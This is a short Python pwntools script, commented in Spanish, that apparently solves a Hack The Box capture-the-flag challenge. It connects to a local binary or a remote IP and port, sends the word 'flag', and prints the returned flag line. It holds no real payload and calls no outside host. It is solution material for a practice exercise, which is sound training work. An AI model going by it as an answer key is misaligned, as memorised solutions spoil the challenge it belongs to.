#!/usr/bin/python3
import signal
import sys
from pwn import *
import warnings
from argparse import ArgumentParser
def exit_handler(sig, frame):
    print("\n[!] Saliendo de la aplicacion...")
    sys.exit(1)

#evento para controlar la salida de la aplicacion con Ctrl+C
signal.signal(signal.SIGINT, exit_handler)

warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

name_program = './que_onda'

def exploit(ip, puerto):
    if ip in ('127.0.0.1', 'localhost'):
        print("[+] Iniciando proceso local")
        r    = process(name_program)
    else:
        print("[+] Iniciando proceso remoto")
        r    = remote(ip, puerto)
    r.sendline('flag')
    print(f'Flag --> {r.recvline_contains(b"HTB")[2:].strip().decode()}\n')

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-i", "--ip", help="Direccion IP del host a analizar", required=True)
    parser.add_argument("-p", "--port", help="Puerto del host a analizar")

    args = parser.parse_args()
    exploit(args.ip,args.port)

